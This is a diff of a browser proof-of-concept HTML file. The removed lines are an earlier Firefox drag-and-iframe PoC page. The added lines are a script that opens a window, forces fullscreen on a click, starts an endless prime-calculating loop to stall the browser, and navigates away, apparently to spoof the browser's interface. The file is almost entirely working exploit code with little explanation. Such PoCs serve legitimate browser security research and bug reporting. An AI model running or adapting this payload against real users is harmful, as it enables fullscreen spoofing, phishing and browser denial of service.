@@ -1,44 +1,46 @@
-<!DOCTYPE html>
-<html>
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<title>PoC</title>
-		<style>
-			* {
-			    margin: 0;
-           		padding: 0;
-			}
+<script>
+function launch() {
+    var newWindow = window.open("", "", "newWindow")
 
-			iframe {
-			    display: white;
-			    background: #000;
-			    border: none;
-			    height: 100vh;
-			    width: 100vw;
-			    position:  absolute;
-			}
+    newWindow.document.write(`<html onmousedown="run();run();">
+    <script>
 
-	       	.text {
-	        	margin-top: 5%;
-	        	margin-left: 30%;
-	        	position: fixed;
-	        }
-		</style>
-		<script>
-			onmessage = (e) => {
-				if (e.data.action === "delete") {
-					iframe.remove();
-				}
-			}
-		</script>
-	</head>
-	<body>
-		<div class="text">
-			<center>
-				<h1>Scroll the page by dragging the scroll bar!</h1>
-			</center>
-		</div>
-		<iframe id="iframe" src="https://lbherrera.github.io/lab/firefox/samesite-drag-366791/iframe.html"></iframe>
-	</body>
-</html>
+    function run() {
+
+    document.documentElement.requestFullscreen()
+
+    // slowdown loop
+    setTimeout(function() { calculatePrimes(1001, 10000) },1)
+
+    location.href = "https://www.example.com"
+
+    }
+
+    function calculatePrimes(iterations, multiplier) {
+        var primes = [];
+        for (var i = 0; i < iterations; i++) {
+            var candidate = i * (multiplier * Math.random());
+            var isPrime = true;
+            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
+                if (candidate % c === 0) {
+                    // not prime
+                    isPrime = false;
+                    break;
+                }
+            }
+            if (isPrime) {
+                primes.push(candidate);
+            }
+        }
+        // calculate primes loop
+        calculatePrimes(iterations, multiplier)
+    }
+    <\/script>
+
+    <h2>Click anywhere on the page</h2>
+
+    </html>`)
+}
+</script>
+
+<button onclick="launch()">Launch</button>
